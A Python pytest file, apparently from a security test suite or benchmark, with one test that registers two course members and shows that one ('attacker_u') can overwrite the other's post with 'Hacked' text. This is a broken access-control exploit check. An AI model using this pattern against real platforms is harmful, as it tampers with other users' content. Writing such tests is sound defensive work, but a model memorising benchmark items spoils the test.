
from helpers import login, logout, register, create_course, add_member, create_post, update_post, get_user_id, get_row

def test_exploit_course_member_can_edit_another_members_post(client, app_instance):
    session, base_url = client
    db_path = app_instance["db_path"]

    assert login(session, base_url, "admin", "admin123").status_code == 200
    course = create_course(session, base_url, "Posts", "demo").json()["course"]

    assert register(session, base_url, "author_u", "pass123", "Author").status_code == 200
    logout(session, base_url)
    assert login(session, base_url, "admin", "admin123").status_code == 200
    author_id = get_user_id(db_path, "author_u")
    assert add_member(session, base_url, course["course_id"], author_id, "student").status_code == 200

    assert register(session, base_url, "attacker_u", "pass123", "Attacker").status_code == 200
    logout(session, base_url)
    assert login(session, base_url, "admin", "admin123").status_code == 200
    attacker_id = get_user_id(db_path, "attacker_u")
    assert add_member(session, base_url, course["course_id"], attacker_id, "student").status_code == 200

    logout(session, base_url)
    assert login(session, base_url, "author_u", "pass123").status_code == 200
    post = create_post(session, base_url, course["course_id"], "Original", "Body").json()["post"]
    logout(session, base_url)

    assert login(session, base_url, "attacker_u", "pass123").status_code == 200
    r = update_post(session, base_url, course["course_id"], post["post_id"], "Hacked", "Owned by peer")
    assert r.status_code == 200, r.text

    changed = get_row(
        db_path,
        "SELECT title, body, author_id FROM posts WHERE post_id=?",
        (post["post_id"],),
    )
    assert changed["author_id"] == author_id
    assert changed["title"] == "Hacked"
    assert changed["body"] == "Owned by peer"
